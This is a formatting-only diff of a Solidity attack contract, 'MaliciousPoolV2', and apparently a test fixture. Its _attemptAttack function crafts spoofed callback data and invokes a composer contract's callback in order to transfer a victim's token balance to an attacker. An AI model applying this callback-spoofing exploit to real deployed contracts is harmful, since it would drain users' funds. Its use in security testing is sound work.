@@ -41,11 +41,14 @@ contract MaliciousPoolV2 {
     function _attemptAttack(uint256 victimBalance) internal {
         bytes memory transferCall = CalldataLib.encodeTransferIn(tokenToSteal, attacker, victimBalance);
 
-        bytes memory maliciousCallbackData =
-            abi.encodePacked(victim, tokenToSteal, address(0), uint112(victimBalance), uint8(0), uint16(transferCall.length), transferCall);
+        bytes memory maliciousCallbackData = abi.encodePacked(
+            victim, tokenToSteal, address(0), uint112(victimBalance), uint8(0), uint16(transferCall.length), transferCall
+        );
 
         (bool success,) = address(composer).call(
-            abi.encodeWithSelector(bytes4(0x10d1e85c), address(composer), uint256(1), uint256(0), new bytes(0), maliciousCallbackData)
+            abi.encodeWithSelector(
+                bytes4(0x10d1e85c), address(composer), uint256(1), uint256(0), new bytes(0), maliciousCallbackData
+            )
         );
     }
 
